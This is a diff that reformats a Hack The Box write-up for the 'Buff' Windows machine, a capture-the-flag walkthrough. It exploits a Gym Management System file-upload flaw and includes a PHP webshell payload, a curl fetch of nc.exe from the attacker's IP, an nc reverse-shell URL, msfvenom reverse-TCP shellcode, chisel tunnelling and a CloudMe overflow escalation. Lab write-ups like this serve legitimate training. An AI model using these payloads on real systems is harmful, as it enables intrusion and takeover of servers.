@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/a5e382064576687994dad818cec556b49685a824/windows-machines/easy/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with - I wish I had taken better notes on this one, since I had done it so long ago I don't remember it so well!...
 
@@ -10,11 +10,11 @@ Short description to include any strange things to be dealt with - I wish I had 
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -24,7 +24,7 @@ I started my enumeration with an nmap scan of `10.10.10.198`. The options I regu
 
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
-```
+```text
 zweilos@kali:~/htb/buff$ nmap -p- -sC -sV --reason -oN buff.nmap -Pn 10.10.10.198
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 10:13 EDT
 Nmap scan report for 10.10.10.198
@@ -43,47 +43,44 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 474.18 seconds
 ```
 
-Only found two open ports: 7680 which nmap reported (with low confidence) as `pando-pub` and 8080, which hosted an Apache HTTP web server.
+Only found two open ports: 7680 which nmap reported \(with low confidence\) as `pando-pub` and 8080, which hosted an Apache HTTP web server.
 
 ### http
 
-mrbe3n's Bro Hut - on about page
-Gym Management Software 1.0 - contact page
+mrbe3n's Bro Hut - on about page Gym Management Software 1.0 - contact page
 
-https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
-https://www.exploit-db.com/exploits/48506
-> Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
-> Exploit Details:
-```
-#   1. Access the '/upload.php' page, as it does not check for an authenticated user session.
-#   2. Set the 'id' parameter of the GET request to the desired file name for the uploaded PHP file.
-#     - `upload.php?id=kamehameha`
-#     /upload.php:
-#        4 $user = $_GET['id'];
-#       34       move_uploaded_file($_FILES["file"]["tmp_name"],
-#       35       "upload/". $user.".".$ext);
-#   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
-#     /upload.php:
-#        5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
-#        6 $extension = @end(explode(".", $_FILES["file"]["name"]));
-#       14 && in_array($extension, $allowedExts))
-#   4. Bypass the file type check by modifying the 'Content-Type' of the 'file' parameter to 'image/png' in the POST request, and set the 'pupload' paramter to 'upload'.
-#        7 if(isset($_POST['pupload'])){
-#        8 if ((($_FILES["file"]["type"] == "image/gif")
-#       11 || ($_FILES["file"]["type"] == "image/png")
-#   5. In the body of the 'file' parameter of the POST request, insert the malicious PHP code:
-#       <?php echo shell_exec($_GET["telepathy"]); ?>
-#   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the '.' character.
-#       30           $pic=$_FILES["file"]["name"];
-#       31             $conv=explode(".",$pic);
-#       32             $ext=$conv['1'];
-#   - Our uploaded file name was 'kaio-ken.php.png'. Therefor $conv['0']='kaio-ken'; $conv['1']='php'; $conv['2']='png'; 
-#   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.
-```
+[https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/](https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/) [https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)
 
+> Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution \(RCE\) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters. Exploit Details:
+>
+> ```text
+> #   1. Access the '/upload.php' page, as it does not check for an authenticated user session.
+> #   2. Set the 'id' parameter of the GET request to the desired file name for the uploaded PHP file.
+> #     - `upload.php?id=kamehameha`
+> #     /upload.php:
+> #        4 $user = $_GET['id'];
+> #       34       move_uploaded_file($_FILES["file"]["tmp_name"],
+> #       35       "upload/". $user.".".$ext);
+> #   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
+> #     /upload.php:
+> #        5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
+> #        6 $extension = @end(explode(".", $_FILES["file"]["name"]));
+> #       14 && in_array($extension, $allowedExts))
+> #   4. Bypass the file type check by modifying the 'Content-Type' of the 'file' parameter to 'image/png' in the POST request, and set the 'pupload' paramter to 'upload'.
+> #        7 if(isset($_POST['pupload'])){
+> #        8 if ((($_FILES["file"]["type"] == "image/gif")
+> #       11 || ($_FILES["file"]["type"] == "image/png")
+> #   5. In the body of the 'file' parameter of the POST request, insert the malicious PHP code:
+> #       <?php echo shell_exec($_GET["telepathy"]); ?>
+> #   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the '.' character.
+> #       30           $pic=$_FILES["file"]["name"];
+> #       31             $conv=explode(".",$pic);
+> #       32             $ext=$conv['1'];
+> #   - Our uploaded file name was 'kaio-ken.php.png'. Therefor $conv['0']='kaio-ken'; $conv['1']='php'; $conv['2']='png'; 
+> #   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.
+> ```
 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/buff]
 └─$ python3 ./buff-exploit.py 'http://10.10.10.198:8080/'                                           1 ⨯
             /\
@@ -96,20 +93,17 @@ https://www.exploit-db.com/exploits/48506
 Exiting.
 ```
 
-Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. 
-Plink is probably not what you want if you want to run an interactive session in a console window
+Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is probably not what you want if you want to run an interactive session in a console window
 
-```
+```text
 10.10.10.198:8080//upload/kamehameha.php?telepathy=DIR
 
 PNG  Volume in drive C has no label. Volume Serial Number is A22D-49F7 Directory of C:\xampp\htdocs\gym\upload 22/08/2020 17:19
 . 22/08/2020 17:19
-.. 22/08/2020 17:19 54 kamehameha.php 22/08/2020 16:43 59,392 nc.exe 22/08/2020 16:55 311,296 plink.exe 3 File(s) 370,742 bytes 2 Dir(s) 7,398,789,120 bytes free 
+.. 22/08/2020 17:19 54 kamehameha.php 22/08/2020 16:43 59,392 nc.exe 22/08/2020 16:55 311,296 plink.exe 3 File(s) 370,742 bytes 2 Dir(s) 7,398,789,120 bytes free
 ```
 
-
-
-```
+```text
 GET /upload/kamehameha.php?telepathy=curl.exe+"http%3a//10.10.15.82%3a8090/nc.exe"+-o+nc.exe HTTP/1.1
 Host: 10.10.10.198:8080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -124,7 +118,7 @@ DNT: 1
 
 ## Initial Foothold
 
-```
+```text
 http://10.10.10.198:8080//upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.15.82%2012346
 
 ┌──(zweilos㉿kali)-[~/htb/buff]
@@ -226,7 +220,7 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 
 so now I was user `shaun` on `BUFF`
 
-```
+```text
 PS C:\Users\shaun> cd Documents 
 cd Documents
 PS C:\Users\shaun\Documents> ls
@@ -244,7 +238,7 @@ cat Tasks.bat
 START C:/xampp/xampp_start.exe
 ```
 
-Tasks.bat was a very simple script that simply started a service 
+Tasks.bat was a very simple script that simply started a service
 
 ## Road to User
 
@@ -252,10 +246,9 @@ Tasks.bat was a very simple script that simply started a service
 
 ### Finding user creds
 
-
 ### User.txt
 
-```
+```text
 PS C:\Users\shaun\desktop> ls
 ls
 
@@ -279,7 +272,7 @@ Got the user flag!
 
 ### Enumeration as `shaun`
 
-```
+```text
 PS C:\xampp> ls
 ls
 
@@ -340,7 +333,7 @@ d-----       16/06/2020     16:31                webdav
 
 Directory listing of xammp folder
 
-```
+```text
 PS C:\xampp> cat xampp-control.log
 cat xampp-control.log
 16:34:10  [main]        Initializing Control Panel
@@ -382,17 +375,17 @@ cat xampp-control.log
 
 so xampp requires administrative rights, and is version 7.4.6, and control panel 3.2.4
 
-https://www.apachefriends.org/blog/new_xampp_20200519.html
+[https://www.apachefriends.org/blog/new\_xampp\_20200519.html](https://www.apachefriends.org/blog/new_xampp_20200519.html)
 
-https://meterpreter.org/xampp/
+[https://meterpreter.org/xampp/](https://meterpreter.org/xampp/)
 
-> XAMPP (stands for Cross-Platform (X), Apache (A), MariaDB (M), PHP (P) and Perl (P)) is very easy to install Apache Distribution for Linux, Solaris, Windows, and Mac OS X. The package includes the Apache web server, MySQL, PHP, Perl, an FTP server and phpMyAdmin. It is a simple, lightweight Apache distribution that makes it extremely easy for developers to create a local web server for testing and deployment purposes. Everything needed to set up a web server – server application (Apache), database (MariaDB), and scripting language (PHP) – is included in an extractable file. It is also cross-platform, which means it works equally well on Linux, Mac, and Windows. Since most actual web server deployments use the same components as XAMPP, it makes transitioning from a local test server to a live server.
+> XAMPP \(stands for Cross-Platform \(X\), Apache \(A\), MariaDB \(M\), PHP \(P\) and Perl \(P\)\) is very easy to install Apache Distribution for Linux, Solaris, Windows, and Mac OS X. The package includes the Apache web server, MySQL, PHP, Perl, an FTP server and phpMyAdmin. It is a simple, lightweight Apache distribution that makes it extremely easy for developers to create a local web server for testing and deployment purposes. Everything needed to set up a web server – server application \(Apache\), database \(MariaDB\), and scripting language \(PHP\) – is included in an extractable file. It is also cross-platform, which means it works equally well on Linux, Mac, and Windows. Since most actual web server deployments use the same components as XAMPP, it makes transitioning from a local test server to a live server.
 
-https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell
+[https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell](https://social.technet.microsoft.com/Forums/en-US/cfa65a6f-3f8c-42ca-9978-bdbffdc99ec5/how-do-i-edit-a-text-file-in-powershell)
 
 > `(Get-Content .\input.txt ).Replace('text','fun') | Out-File .\output.txt`
 
-```
+```text
 PS C:\xampp> cat passwords.txt
 cat passwords.txt
 ### XAMPP Default Passwords ###
@@ -422,16 +415,16 @@ cat passwords.txt
    Attention: WEBDAV is not active since XAMPP Version 1.7.4.
    For activation please comment out the httpd-dav.conf and
    following modules in the httpd.conf
-   
+
    LoadModule dav_module modules/mod_dav.so
    LoadModule dav_fs_module modules/mod_dav_fs.so  
-   
+
    Please do not forget to refresh the WEBDAV authentification (users and passwords)
 ```
 
 found passwords.txt
-   
-```
+
+```text
    PS C:\xampp> cat mysql_start.bat
 cat mysql_start.bat
 @echo off
@@ -456,14 +449,16 @@ pause
 :finish
 ```
 
-myslq_start.bat
+myslq\_start.bat
 
-```
+```text
 PS C:\xampp\mysql\bin> ./mysqldump.exe --all-databases -u root > ~/Downloads/dmp.txt      
 ./mysqldump.exe --all-databases -u root > ~/Downloads/dmp.txt
 ```
-https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html
-```
+
+[https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html](https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html)
+
+```text
 PS C:\xampp\mysql> ls
 ls
 
@@ -490,7 +485,7 @@ d-----       16/06/2020     16:31                share
 
 found an interesting batch script in the mysql folder
 
-```
+```text
 PS C:\xampp\mysql> cat resetroot.bat
 cat resetroot.bat
 @echo off
@@ -511,15 +506,14 @@ pause
 
 reset the root login for sql
 
-```
+```text
 PS C:\xampp\mysql\bin> ./mysql.exe -u root
 ./mysql.exe -u root
 ```
 
 msql
 
-```
-
+```text
 New XAMPP release 7.2.31 , 7.3.18 , 7.4.6
 
 Hi Apache Friends!
@@ -542,7 +536,7 @@ Enjoy!
 
 Non-rabbit =
 
-```
+```text
 PS C:\Users\shaun\Downloads> ls
 ls
 
@@ -557,7 +551,7 @@ Mode                LastWriteTime         Length Name
 
 Found `Cloudme_1112.exe` in the `/Downloads` folder
 
-```
+```text
 PS C:\Program Files (x86)> ps
 ps
 
@@ -572,7 +566,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 
 ps
 
-```    
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ searchsploit cloudme
 ---------------------------------------------------------------------- ---------------------------------
@@ -592,10 +586,9 @@ CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)            | windows_
 Shellcodes: No Results
 ```
 
-I had to test multiple of the exploits before I found one that actually worked. I'm certain that it was more the fact that this was an easy box that was being hammered by many many people. Even after choosing the right exploit I had to reset the machine to get it to run.
-had to recompile some of the shellcode in the exploit with the provided msfvenom command
+I had to test multiple of the exploits before I found one that actually worked. I'm certain that it was more the fact that this was an easy box that was being hammered by many many people. Even after choosing the right exploit I had to reset the machine to get it to run. had to recompile some of the shellcode in the exploit with the provided msfvenom command
 
-```
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.220 LPORT=12345 -f c                                       
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -628,20 +621,16 @@ unsigned char buf[] =
 "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
 ```
 
-two options for creating a tunnel in order to run the local exploit against the remote machine.
-plink?
+two options for creating a tunnel in order to run the local exploit against the remote machine. plink?
 
-```
+```text
 https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html
 https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
 ```
 
-or chisel?
-https://github.com/jpillora/chisel
-https://www.puckiestyle.nl/pivot-with-chisel/
-https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+or chisel? [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) [https://www.puckiestyle.nl/pivot-with-chisel/](https://www.puckiestyle.nl/pivot-with-chisel/) [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
 
-```
+```text
 PS C:\Users\shaun\Downloads> ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
 ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
 2020/08/23 23:43:11 client: Connecting to ws://10.10.15.82:8099
@@ -649,11 +638,11 @@ PS C:\Users\shaun\Downloads> ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:
 2020/08/23 23:43:13 client: Connected (Latency 53.5461ms)
 ```
 
-http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.14.220%2012346
+[http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe -e powershell.exe 10.10.14.220 12346](http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe%20-e%20powershell.exe%2010.10.14.220%2012346)
 
 Had to manuallly upload both nc.exe and chisel.exe...used burp repeater
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/buff]
 └─$ chisel server -p 8099 --reverse                                        
 2020/08/23 18:27:12 server: Reverse tunnelling enabled
@@ -666,7 +655,7 @@ R:8000:127.0.0.1:7890
 
 ### Getting a shell
 
-```
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ nc -lvnp 12345                                                                                  1 ⨯
 listening on [any] 12345 ...
@@ -744,7 +733,7 @@ and then I was logged in as Administrator, with full privileges.
 
 ### Root.txt
 
-```
+```text
 c:\Users\Administrator\Desktop>type root.txt
 type root.txt
 b7f7dbc6de4b535a2e84e8c3362d081b
@@ -755,3 +744,4 @@ After getting an Administrator shell it was simple to collect my final proof.
 Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
